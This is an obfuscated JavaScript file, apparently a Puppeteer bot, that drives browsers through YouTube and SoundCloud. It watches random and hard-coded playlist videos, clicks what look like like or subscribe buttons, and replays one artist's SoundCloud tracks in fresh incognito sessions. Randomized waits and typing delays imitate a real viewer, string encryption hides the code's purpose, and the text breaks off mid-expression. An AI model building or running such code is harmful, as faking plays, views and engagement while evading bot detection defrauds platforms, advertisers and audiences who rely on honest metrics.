function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x877 + -0x1 * 0x133 + -0x744);
    let h = e[f];
    return h;
  }, d(b, c);
}
const Y = c,
  X = b,
  W = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x1 * 0x45f + -0x5d3 + 0xa33))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x441 * 0x7 + 0x2295 + 0x19a * -0x3), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x1 * -0x60b + -0xcfc2 + 0xb * 0x1e17 + (-0x1236 + -0x5533 + 0x43 * 0x26b) * random()) : await standardWaitForNetIdle(f), await wait(0x337 + 0x412 * -0x3 + 0x6d * 0x43 + (0x1587 + -0xcf * 0x1 + 0x1258) * random()), 0x1202 + 0x8 * 0x3e5 + -0x3129 * 0x1;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x2e * 0xa9 + -0x317 * -0x4 + 0x258a), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x23c1 + -0x2336 + 0x46f8;
}

function a() {
  const bp = [
    'BwLU',
    'childNodes',
    'AwXSlM9YzW',
    'https://ww',
    'ipny6JUbzw',
    'locking-a6',
    'W6XqW6y6W6JdGW',
    'WR1Kn8kFkHpcUmkgCq',
    '-routes-7c',
    'hmoBDCoXF8kGW7XsW53dOW',
    'ywXZlw9MlwmTzq',
    'clipboard&',
    's2qiD8kNW6u',
    'easyfork.o',
    'W4NcN2/dJmolW7fRWODCFa',
    'tdRdVX/dStZdMSoYW6Sl',
    'CYXHCM15igj0CW',
    'fYddRrxcHW',
    'yxbLx19MAwXS',
    'C2LIBguTCgXHEq',
    'BcXTB29TB28UAq',
    'rg/scripts',
    'dGP5T2FYIZ',
    'WOfoWQdcVmkMAZqTWOpcRG'
  ];
  a = function() {
    return bp;
  };
  return a();
}
async function randomWait() {
  return await wait(-0x1ddf + -0x190f + 0x4a76 + (0x4 * -0x10b + -0xc3 * -0x19 + 0x4a9 * 0x1) * random()), -0x157f + 0x1 * 0x7c7 + 0xdb9;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0xf5 * 0x23 + -0x2603 + 0x484, -0x4 * 0x83f + 0x1 * 0x24a9 + -0x3a6 * 0x1), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x1 * -0xa2a3 + -0x594c + 0xa109) * getRandomInt(-0x1a60 + 0x1 * 0xe09 + 0xc59, -0x566 * 0x2 + 0x2 * -0xbc5 + 0x225b), h)), 0x20a7 * 0x1 + -0x11af + -0xef7;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x877 + -0x1 * 0x133 + -0x744);
    let h = e[f];
    if (b['NgIGxB'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x971 * -0x3 + -0x173e + -0x515 * 0x1, s, t, u = 0x1b97 + 0x1c27 + -0x1 * 0x37be; t = n['charAt'](u++); ~t && (s = r % (-0x5d3 + 0xe4a + -0x873) ? s * (-0x441 * 0x7 + 0x2295 + 0x247 * -0x2) + t : t, r++ % (0x1 * -0x102 + -0x22a1 + 0x1 * 0x23a7)) ? p += String['fromCharCode'](-0x612 + -0x1c66 + 0x7 * 0x511 & s >> (-(0x337 + 0x412 * -0x3 + 0x1cd * 0x5) * r & 0xac4 + -0x67 * 0x1 + -0xa57)) : 0x1202 + 0x8 * 0x3e5 + -0x1895 * 0x2) {
          t = o['indexOf'](t);
        }
        for (let v = -0x2e * 0xa9 + -0x317 * -0x4 + 0x1202, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x23c1 + -0x2336 + 0x4707))['slice'](-(-0x1ddf + -0x190f + 0x36f0));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x4 * -0x10b + -0xc3 * -0x19 + 0x4f5 * -0x3,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x157f + 0x1 * 0x7c7 + 0xdb8; u < 0xf5 * 0x23 + -0x2603 + 0x584; u++) {
          p[u] = u;
        }
        for (u = -0x4 * 0x83f + 0x1 * 0x24a9 + -0x3ad * 0x1; u < -0x1 * -0xd8e + -0x771 + -0x51d; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x1a60 + 0x1 * 0xe09 + 0xd57), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x566 * 0x2 + 0x2 * -0xbc5 + 0x2256, q = 0x20a7 * 0x1 + -0x11af + -0xef8;
        for (let v = -0x1c36 + 0x224e + 0x18 * -0x41; v < n['length']; v++) {
          u = (u + (0x1498 + 0x694 + -0x1b2b)) % (0x119 * 0x1f + -0x1 * 0xaae + -0x1659), q = (q + p[u]) % (-0x11dd + 0x2 * -0xe5e + 0x2f99 * 0x1), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x1 * -0x209 + -0xed + 0x6 * 0xa9)]);
        }
        return t;
      };
      b['dEqkiq'] = m, c = arguments, b['NgIGxB'] = !![];
    }
    const j = e[0x2b * 0x8b + 0x102c + -0x43 * 0x97],
      k = f + j,
      l = c[k];
    return !l ? (b['tkIgVa'] === undefined && (b['tkIgVa'] = !![]), h = b['dEqkiq'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x1c36 + 0x224e + 0x18 * -0x41;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x1498 + 0x694 + -0x1b2b]['split']('\x20');
    for (let k = 0x119 * 0x1f + -0x1 * 0xaae + -0x1759; k < i['length']; k += -0x11dd + 0x2 * -0xe5e + 0xf89 * 0x3)
      j += i[k] * h[i[k + (0x1 * -0x209 + -0xed + 0xb * 0x45)]];
    return j;
  });
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x877 + -0x1 * 0x133 + -0x744);
    let h = e[f];
    if (c['nCROSf'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x971 * -0x3 + -0x173e + -0x515 * 0x1, r, s, t = 0x1b97 + 0x1c27 + -0x1 * 0x37be; s = m['charAt'](t++); ~s && (r = q % (-0x5d3 + 0xe4a + -0x873) ? r * (-0x441 * 0x7 + 0x2295 + 0x247 * -0x2) + s : s, q++ % (0x1 * -0x102 + -0x22a1 + 0x1 * 0x23a7)) ? o += String['fromCharCode'](-0x612 + -0x1c66 + 0x7 * 0x511 & r >> (-(0x337 + 0x412 * -0x3 + 0x1cd * 0x5) * q & 0xac4 + -0x67 * 0x1 + -0xa57)) : 0x1202 + 0x8 * 0x3e5 + -0x1895 * 0x2) {
          s = n['indexOf'](s);
        }
        for (let u = -0x2e * 0xa9 + -0x317 * -0x4 + 0x1202, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x23c1 + -0x2336 + 0x4707))['slice'](-(-0x1ddf + -0x190f + 0x36f0));
        }
        return decodeURIComponent(p);
      };
      c['ddpPKC'] = i, b = arguments, c['nCROSf'] = !![];
    }
    const j = e[0x4 * -0x10b + -0xc3 * -0x19 + 0x4f5 * -0x3],
      k = f + j,
      l = b[k];
    return !l ? (h = c['ddpPKC'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function anchorAndView(f) {
  const R = c;
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x2b * 0x8b + 0x102c + -0x1 * 0x277f)['map'](l => Array['from'](l['children']))['flat'](0x193b + 0x1b8d + 0x3b * -0xe5)['map'](l => l['childNodes'][-0x1 * -0x1069 + 0x1 * -0x6d7 + -0x1f * 0x4f]['childNodes'][-0x67 * 0x43 + -0x2 * 0x832 + 0x2b59]['childNodes'][0x1 * 0x4bd + -0x2673 + -0x7 * -0x4d1]['childNodes'][-0x24ff + 0x7d3 + 0x1d2c]['childNodes'][-0x1 * -0x100d + 0x5db * 0x1 + -0x15e7]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x5b9 + 0x9 * -0x5 + 0x9ce, -0x8ef * -0x1 + 0x343 * 0x7 + -0xc3c)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x50ac + -0x4be0 + 0x35cc);
  const h = await getMaxTime(f),
    i = Math[R(0x0)]((-0x3ee * 0x2e + 0x891 + 0x19693) * getRandomInt(0x12b7 + -0x1bd9 + 0x924, -0x2 * 0x1237 + -0x26db + 0x4b4e), h);
  return await wait(i), 0x1017 + 0x1 * -0x1f21 + 0x1 * 0xf0b;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x51 * -0x54 + -0x4 * -0x8bf + -0x868]['children'][-0x279 + 0x14ed + 0x93a * -0x2]['children'][0xf0b + 0x1569 + -0x4 * 0x91d]['children'][0x7c8 + 0x6 * 0x647 + -0x67e * 0x7]['children'][-0x5de + -0x28e + 0x86c]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x2013 + 0x1f6 * 0x3 + 0x7 * 0x3be;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x32 * 0xb4 + -0x2701 + 0x4a8d + (-0x2585 + 0xe47 + -0xf * -0x190) * random()
  }), await wait(-0x116f + 0x1 * -0x160 + 0x427 * 0x5 + (0x156c + 0x678 + 0x6ae * -0x4) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const S = d,
      k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x71 * -0x1a + -0x588 + 0x1104]['childNodes'][-0xfc3 + -0x2221 + 0x1 * 0x31e5]['childNodes'][0x10cd + 0x25 * -0xb7 + 0x7 * 0x161]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x1d03 + -0x1251 + 0x2f59]['childNodes'][0xb3e * -0x1 + 0x518 + 0x313 * 0x2][S(0x1)][-0x5 * 0x477 + 0x26d2 + -0x9 * 0x1d5]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0xefe * 0x1 + -0x2d * -0x61 + -0x200a),
          r = -0x1 * -0x125 + 0xca9 + 0xdce * -0x1;
        for (let u = 0x2 * 0x283 + -0x455 + 0x3 * -0x3b; u < q['length']; u += 0x70f * -0x5 + -0x160 * -0x9 + 0x16ed)
          r += q[u] * k[q[u + (-0x2 * -0x1319 + -0x131 * -0x11 + 0x1 * -0x3a72)]];
        return r;
      }(n);
  });
  await wait((0x1c86 * 0x2 + 0x7 * -0xbd4 + 0x5458) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x1db * 0x1b + -0x1 * 0x6c91 + 0x1890a) * getRandomInt(0x1ebd + -0x1 * 0x275 + -0x1c47, 0x1e5b + -0x54c + -0x1905), h + (-0x1fd + 0x1b4b + -0x5c6));
  return await wait(i), 0x2672 + 0x245 * -0xb + -0xd7a;
}
async function keyWatch(f) {
  const T = c;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x18c1 * 0x1 + 0x250e + -0x3dcf), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + T(0x12)), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0xc9f + 0x1 * -0x1317 + -0x15b7 * -0x2 + (-0x2b * 0xd9 + -0x56a + 0x2dc5) * Math['random']());
    });
  }, -0x289e + 0x32be + 0x1 * 0x1138);
  await wait(-0x4ad80 + -0xc0b6 + 0xa0216);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x5 * -0x487b + 0xb301 + 0x5 * -0x3d68) * getRandomInt(-0x1c * -0x7a + 0x182b + -0x14b * 0x1d, -0x2b5 * 0x5 + -0xeb3 + 0x1c55)), clearInterval(h), -0xc90 + -0x1082 + 0x1d13;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x17b * -0xf + -0x1 * 0x1a17 + 0x304c;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x18d * 0x12 + 0x2280 + -0x695;
    await randomWait();
  }
  return 0x24e * 0x5 + -0x106a + 0x4e5;
}

function fetchRandomSC() {
  const U = d;
  return Math['random']() <= -0x2217 + -0x9bb + 0x9e * 0x47 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x3c8 + 0x2284 + 0x464 * -0x7 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + U(0xb) + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0xd * -0xf8 + 0x1664 * 0x1 + 0x1 * -0x22fc + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x1528 + 0x24c9 + 0x1 * -0x39f1;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x5 * -0x47 + 0x1 * -0xa195 + 0x152c0 + getRandomInt(-0x441c + 0x2b * -0x233 + 0xdd45, -0x3 * 0xde5 + -0x43 * 0x6b + -0x256 * -0x50));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x1856 + -0x2515 + 0x1 * 0x3d6c), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x212b + -0x2078 + -0xb3;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x1e59 + -0x133e * -0x2 + -0x823, -0x1 * 0x78b + 0x236c + 0x1 * -0x1baf)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x27 * -0xdf + 0x8 * 0x471 + -0x1 * 0x3db1 + floor((-0x230c + -0x6f * -0x35 + 0xff9) * random()))), log('p2'), log(await s['evaluate'](() => {
        const aF = {
          f: 0x6
        };
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x1 * 0xe362f1e4 + -0x12c3 * 0xd6b7c + 0x11e622 * 0x21ec),
          0x6ab1cc * -0x2 + 0x9a1ec4 + -0x5fc * -0x1f4b,
          0x1a6 * 0x61 + 0x7367 + 0x7 * -0x150b,
          0x3 * -0x82b + -0x5 * -0x770 + 0x1 * -0xc2f
        ], y = [
          0x16f5 + 0x5 * -0x3f9 + -0x100 * 0x3,
          -0x1 * -0x1d53 + -0xfa7 * -0x1 + -0x2cea,
          0x1 * 0x1776 + 0x142 * -0x16 + 0x43e,
          -0xbe * 0x31 + -0x15 * -0x15c + -0xd * -0x9a
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x1e99 + 0x27 * -0x28 + 0x24b2)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x79e + -0x35e * 0x7 + 0xff4; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x5a9 * -0x5 + -0x2006 + 0x3c53) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0xdd1 + -0x22a + 0x1 * 0xffb] = A[0x1 * 0x15b8 + -0x2483 + -0xedb * -0x1] = A[0x1 * 0xa34 + -0x2f5 + -0x73e] = A[-0x76d + -0x1ab3 + 0x22 * 0x101] = A[0x2a1 + 0x110b * 0x2 + -0x24b4] = A[-0x2 * 0x128b + -0x6 * -0x67 + 0x22b0] = A[-0x95c + -0x1e * 0x92 + -0x1a7d * -0x1] = A[-0x1 * 0x12f4 + -0x1218 + -0x92 * -0x41] = A[0x1702 + -0x1c7 * 0xd + 0x20] = A[0x725 * 0x5 + 0x100b + -0xb * 0x4b4] = A[-0x40f * 0x2 + -0x1 * -0xf39 + -0x712] = A[-0x1 * 0x22e1 + 0x2 * 0xe8 + 0x235 * 0xf] = A[-0x304 + -0x361 * 0x7 + -0xd * -0x20e] = A[0x1 * -0x243e + 0x1 * 0x18ff + -0x1 * -0xb4b] = A[0x9bd * -0x1 + -0x1b58 + 0x2522] = A[-0xa93 + 0x1ff6 + -0x1 * 0x1555] = A[-0x4f * 0x7 + 0x22 * 0x43 + -0x5 * 0x156] = 0x2181 + 0x1f5e + -0x40df, this['blocks'] = A) : this['blocks'] = [
                -0x50b * -0x6 + -0x7bd * -0x4 + -0x3d36,
                -0x375 * 0x3 + 0x482 * 0x2 + 0x15b,
                -0xffa + 0xa * -0x185 + 0x1f2c,
                0x1 * -0x1b88 + -0x86 * 0x33 + 0x1 * 0x363a,
                -0xbce + 0x6 * -0x575 + 0x2c8c,
                -0x5d7 * -0x5 + 0x1171 + -0x6 * 0x7c6,
                -0x1fe5 + -0x1b62 + 0x3b47,
                -0x2078 + -0x21 * -0xf + 0x1e89 * 0x1,
                0x22b2 + -0xdc5 + -0x14ed * 0x1,
                -0x220a + 0x259 + 0x7 * 0x487,
                -0x1 * -0x20ad + -0x6d * 0x4 + -0x3 * 0xa53,
                0xcaf * 0x3 + 0x1f6 * -0xb + -0x107b,
                0x2325 * -0x1 + 0x23ea + -0xc5,
                0x9 * -0xa8 + 0x1d29 * -0x1 + 0xbf * 0x2f,
                0x1 * -0x170f + -0x1d9b + 0x34aa,
                0x15cf + -0x18eb * 0x1 + -0x2 * -0x18e,
                0x1 * 0xef9 + 0xda7 + -0xe50 * 0x2
              ], this['h0'] = 0x151546 + 0xae5d4f5a + -0x472d419f, this['h1'] = -0x15c9293a + 0x1 * 0x9d7b94e + 0x1 * 0xfbbf1b75, this['h2'] = 0xa1242f30 + -0x94efe36 + 0x2 * 0x72d602, this['h3'] = -0x39d9c * 0x3f2 + 0x1ce66846 + -0x65858 * -0x3f, this['h4'] = 0x1 * -0x12aead07 + -0x70cdf8f1 * 0x1 + 0x1474f87e8, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0xb15 + -0x1 * 0x20b9 + 0x2bce, this['finalized'] = this['hashed'] = 0x1dbb + 0x1a5e + -0x3819, this['first'] = 0xcde + 0x2047 * 0x1 + -0x3 * 0xf0c;
            }
            ['update'](J) {
              const V = b;
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x1ab + 0x1b94 + -0x1 * 0x1d3f, O = J[V(aF.f, 'MGvs')] || 0x49e + -0x437 + -0x1 * 0x67, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x215 + -0x26 * 0x6b + 0xdcd, P[0x1 * -0xd3 + 0x1f15 * -0x1 + -0x7fa * -0x4] = this['block'], P[0xc6 + -0x1 * 0x5a2 + 0x4ec] = P[-0x298 + 0x128f * 0x2 + -0x1 * 0x2285] = P[-0xc06 + 0x10d1 + 0x5 * -0xf5] = P[0x2b * -0xaa + 0xbf8 + 0x1099] = P[0x659 + -0x87b + 0x226] = P[0x5 * 0x3c + -0x76 + 0x3 * -0x3b] = P[0x4f0 + 0x4 * -0x7f1 + -0x1 * -0x1ada] = P[-0x1 * 0x114a + -0x9 * -0x29f + -0x2 * 0x323] = P[0xa31 + 0x24e + -0xc77 * 0x1] = P[-0xaa0 + 0x2153 + 0x3c7 * -0x6] = P[-0xb * 0x34a + 0x2547 + 0x1 * -0x10f] = P[0x1871 + -0x1 * -0xb55 + -0x23bb] = P[0x2327 + 0x160d + -0xe4a * 0x4] = P[0x201a + -0x3 * 0x2f5 + -0x172e] = P[0xc19 + -0x65 * -0x59 + -0x2f28] = P[0xcbc + -0x10fd + 0x17 * 0x30] = -0x1046 + 0x182 * 0x13 + -0xc60), K) {
                    for (N = this['start']; M < O && N < 0x4f * -0x2f + 0x6e1 * -0x1 + 0x15a2; ++M)
                      P[N >> -0x125 * -0xf + 0x2173 + -0x329c] |= J[M] << y[-0xd44 + 0xd * 0x34 + 0xaa3 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x5 * -0x376 + 0x2 * -0x641 + 0x34 * 0x94; ++M)
                      (L = J['charCodeAt'](M)) < 0xbae + -0x40f * 0x4 + 0x1 * 0x50e ? P[N >> -0x1 * 0x157f + 0x1525 + -0x17 * -0x4] |= L << y[-0xa7f + -0x14f0 + 0x64a * 0x5 & N++] : L < -0x7 * 0x77 + 0x259e + 0x18d * -0x11 ? (P[N >> -0x1 * 0x47 + -0xd4e + -0x1f1 * -0x7] |= (-0x23c + -0x1 * -0x229f + -0x1fa3 | L >> -0x9b3 + 0x4bf * 0x6 + 0x12c1 * -0x1) << y[0x9a * 0x33 + 0x26ac + -0x4557 & N++], P[N >> -0x121 * -0x2 + -0x1b0a + 0x18ca] |= (-0x2f * 0x61 + -0xa11 + 0x2 * 0xe30 | -0x73e * -0x3 + -0xfb * 0x1f + 0x8ea * 0x1 & L) << y[0xf49 + 0xb6d + -0x1ab3 & N++]) : L < 0x509 * 0x18 + -0xfe33 + -0x241 * -0x9b || L >= 0x3 * 0x92da + -0xa03a + -0x3854 ? (P[N >> -0x1 * 0x189d + -0x1b59 + -0x19fc * -0x2] |= (-0x264f * -0x1 + 0x1 * 0x1af + -0x271e | L >> -0x418 + 0x1807 + -0x13e3) << y[-0x256a + 0x195f * -0x1 + 0x1f66 * 0x2 & N++], P[N >> 0x26c2 + 0xb1 * 0x2b + -0x447b] |= (-0x1 * -0xaf4 + 0x6d9 * -0x3 + 0xa17 | L >> 0x14b * -0x1e + 0x1e05 + 0x8cb * 0x1 & 0x11 * 0x2 + 0x26e9 + 0x2fc * -0xd) << y[0x27f * 0x2 + 0x4fb + -0x9f6 & N++], P[N >> 0x7e0 + 0x1 * 0x15c3 + -0x1da1] |= (-0x19 * 0x73 + -0x13 * -0x1a7 + -0x13aa | 0x57c + -0x15d8 + 0x109b & L) << y[0x1 * -0x1aca + 0x4a3 + -0x1 * -0x162a & N++]) : (L = -0x2 * 0xfafe + -0x1e39 * 0x1 + 0x31435 + ((-0x254f * -0x1 + 0x1347 + 0x1 * -0x3497 & L) << -0x9 * -0x41b + -0x1f13 + -0x5d6 | 0xfb3 + 0xd4b + 0x4f * -0x51 & J['charCodeAt'](++M)), P[N >> 0x1f2 + 0x1313 + -0x1503] |= (0x3e2 + 0x1 * -0xa09 + 0x717 | L >> 0x19f9 + 0x1048 + -0x2a2f) << y[-0xf35 + 0x1ade + -0x3e2 * 0x3 & N++], P[N >> 0x7 * -0x201 + -0x20e1 + 0x2eea] |= (-0xebf * 0x1 